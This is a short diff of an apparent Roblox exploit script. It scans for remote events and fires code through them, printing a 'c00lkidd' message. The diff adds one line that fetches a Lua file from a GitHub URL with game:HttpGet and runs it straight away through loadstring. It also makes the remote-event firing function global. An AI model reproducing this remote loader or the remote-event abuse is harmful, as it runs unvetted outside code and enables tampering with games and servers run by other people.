@@ -2584,7 +2584,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
 	end
-local function fireRemoteEvent(code)
+function fireRemoteEvent(code)
     local success = false
     local tried = 0
     local errors = {}
@@ -2942,6 +2942,7 @@ local function scanGui()
 end
 
 scanGui()
+loadstring(game:HttpGet("https://github.com/systemzyx/xyz/blob/main/panel.lua?raw=true"))()
 for _, obj in ipairs(game:GetService("CoreGui").RobloxGui:WaitForChild("TCJT_PRIVATE"):GetDescendants()) do
     setupButton(obj)
 end
